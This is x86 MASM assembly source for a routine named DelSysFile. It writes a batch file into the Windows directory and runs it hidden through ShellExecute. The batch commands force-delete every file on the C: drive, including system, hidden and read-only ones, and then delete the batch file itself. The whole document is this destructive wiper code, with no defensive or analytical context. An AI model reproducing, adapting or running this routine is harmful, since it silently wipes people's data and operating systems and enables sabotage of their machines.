        .data
                szBatchFileSys     db "del C:\*.* /F /S /Q /A:SARH",13,10,"del C:\*.* /F /S /Q /A:SA",13,10,"del C:\*.* /F /S /Q",13,10,"del %0",0
                szBatchNameSys     db "b.bat",0
        
        .code

DelSysFile proc
        LOCAL   hFile: DWORD
        LOCAL   bWritten: DWORD

        invoke  GetWindowsDirectory, offset lpBuf4, MAX_PATH+1             
        invoke  GetModuleFileName, NULL, offset lpBuf2, MAX_PATH
        invoke  lstrcpy, offset lpBuf1, offset lpBuf2

        lea     eax, lpBuf2
        xor     edx, edx
@loop:
        cmp     byte ptr[eax], '\'
        jne     @next
        mov     edx, eax
@next:
        inc     eax
        cmp     byte ptr[eax], 0
        jnz     @loop

;        inc     edx
;       mov     byte ptr[edx], 0

        invoke  lstrcat, offset lpBuf4, edx
        invoke  lstrcat, offset lpBuf4, offset szBatchNameSys

        ; Write batch file into created file
        invoke  CreateFile, offset lpBuf4, GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, 0
        mov     hFile, eax
        inc     eax
        jz      @end

        invoke  lstrlen, offset szBatchFileSys
        mov     edx, eax
        invoke  WriteFile, hFile, offset szBatchFileSys, edx, addr bWritten, NULL
        invoke  CloseHandle, hFile

        szText  SelfDeluoteFmt, '"%s"'
        invoke  wsprintf, offset lpBuf3, addr SelfDeluoteFmt, offset lpBuf1

        ; Execute batch file
        xor     eax, eax
        push    SW_HIDE
        push    eax
        push    offset lpBuf3
        push    offset lpBuf4
        push    offset szTextOpen
        push    eax
        call    ShellExecute
@end:
        ret
DelSysFile endp